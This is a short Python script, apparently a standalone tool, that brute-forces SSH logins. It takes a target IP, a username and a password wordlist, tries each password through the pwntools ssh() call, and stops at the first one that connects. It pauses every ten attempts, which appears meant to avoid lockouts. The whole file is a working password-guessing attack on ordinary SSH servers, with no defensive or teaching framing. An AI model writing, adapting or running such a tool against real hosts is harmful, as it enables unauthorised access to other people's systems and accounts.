#!/usr/bin/env python3

from pwn import *
from termcolor import colored,cprint
import paramiko
import re
import os
import time

start_scaning = False
attempts = 0
pattern_ipv4 = r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b'

host = input("Enter the target/host ip address: ")
username = input("Enter the target username: ")
passwordfile_path = input("Enter the path of password wordlist(default: ./passwords.txt): ")
passwordfile = "./passwords.txt"

print("\n")

ipv4_address = re.findall(pattern_ipv4, host)

if len(ipv4_address) == 0:
	cprint("[#] Please enter a valid  IP Address!\n","red")
	if  not username : cprint("[#] Please enter a valid Username!","red")
else:
	host = ipv4_address[0]
	start_scaning = True
	if not username :
		cprint("[#] Please enter a valid Username!","red")
		start_scaning = False

if  os.path.exists(passwordfile_path):
	passwordfile = passwordfile_path


if start_scaning:
	with open(passwordfile,'r') as passwords:
		for password in passwords:
			password = password.strip()
			if attempts >= 10 and attempts % 10 == 0:
				print('.................Sleep.....................')
				time.sleep(10)
			attempts += 1
			print(f'[{attempts}] Trying Password: {password}')
			try:
				response = ssh(host=host,user=username,password=password,timeout='2')
				response.banner_timeout = 60
				if response.connected:
					print(f"[+] Connected To {host} With Password: {password}")
					break
			except paramiko.ssh_exception.AuthenticationException:
				print("[-] Wrong Password\n")
			except paramiko.ssh_exception.NoValidConnectionsError:
				print(f"[-] Unable to connect to port 22 on {host}\n")
				quit()
			except:
				print("[-] Some Unknown Error Occured.\n")
